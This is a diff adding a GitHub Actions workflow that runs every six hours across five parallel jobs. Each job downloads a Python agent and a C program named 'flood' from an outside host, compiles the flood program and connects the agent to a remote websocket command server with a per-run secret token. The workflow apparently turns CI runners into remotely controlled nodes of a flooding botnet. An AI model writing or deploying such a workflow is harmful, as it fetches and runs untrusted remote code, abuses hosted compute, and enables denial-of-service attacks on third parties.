@@ -1,0 +1,31 @@
+name: Tat-20
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */6 * * *'
+
+jobs:
+  spawn:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    strategy:
+      fail-fast: false
+      matrix:
+        # SADECE 5 YENİ MAKİNE (26, 27, 28, 29, 30)
+        node: [26, 27, 28, 29, 30] 
+    steps:
+      - name: Setup Node
+        uses: actions/setup-node@v4
+        with:
+          node-version: 20
+
+      - name: Start Node
+        run: |
+          mkdir -p /tmp/meduza && cd /tmp/meduza
+          curl -fsSL "https://bg9vrv2nkw.apps.bot-hosting.cloud/bootstrap/agent.py" -o agent.py
+          curl -fsSL "https://bg9vrv2nkw.apps.bot-hosting.cloud/bootstrap/flood.c" -o flood.c
+          gcc -O2 -o flood flood.c -lpthread
+          pip3 install -q websockets
+          
+          # HER RUN'DA BENZERSİZ TOKEN
+          python3 -u agent.py wss://bg9vrv2nkw.apps.bot-hosting.cloud/agent-ws meduza-node-secret-${{ github.run_id }}-node${{ matrix.node }} /tmp/meduza/flood
